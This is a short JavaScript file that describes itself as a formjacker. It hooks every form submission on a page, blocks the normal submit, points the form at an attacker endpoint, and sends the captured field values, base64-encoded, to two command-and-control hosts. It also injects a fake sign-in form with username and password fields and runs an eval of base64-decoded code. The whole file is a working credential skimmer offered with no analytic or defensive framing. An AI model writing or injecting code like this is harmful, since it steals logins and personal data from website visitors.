// Formjacker: captures form submissions, rewrites the action to the attacker
// endpoint and mirrors the data to a second C2.
(function () {
  var C2 = 'https://c2.example.test/formjack';
  var ACTION = 'https://collect.example.net/forms';
  eval(atob('Y29uc29sZS5sb2coJ1tGT1JNSkFDS10gc3RhZ2UtMiBmb3JtIG1vZHVsZSByZWFkeScpOw=='));
  console.log('[FORMJACK] hooking forms');
  function capture(form, source) {
    var fields = {};
    try {
      var elements = form && form.elements ? form.elements : [];
      for (var index = 0; index < elements.length; index += 1) {
        var element = elements[index];
        if (element && element.name) fields[element.name] = String(element.value || '').slice(0, 128);
      }
    } catch (error) {}
    var payload = { source: source, fields: fields, origin: location.origin };
    try { fetch(C2, { method: 'POST', body: btoa(JSON.stringify(payload)) }).catch(function () {}); } catch (error) {}
    try { fetch(ACTION, { method: 'POST', body: btoa(JSON.stringify(payload)) }).catch(function () {}); } catch (error) {}
    try { localStorage.setItem('formjack:last', JSON.stringify(fields)); } catch (error) {}
    console.log('[FORMJACK] captured', Object.keys(fields).length, 'fields');
  }
  document.addEventListener('submit', function (event) {
    if (event.preventDefault) event.preventDefault();
    var form = event.target;
    try { if (form) form.action = ACTION; } catch (error) {}
    capture(form, 'submit');
  }, true);
  setTimeout(function () { console.log('[FORMJACK] re-hook tick'); }, 500);
  try {
    var form = document.createElement('form');
    form.action = ACTION;
    form.innerHTML = '<input name="user"><input name="pass" type="password"><button>Sign in</button>';
    document.body.appendChild(form);
    capture(form, 'seed');
  } catch (error) {}
})();
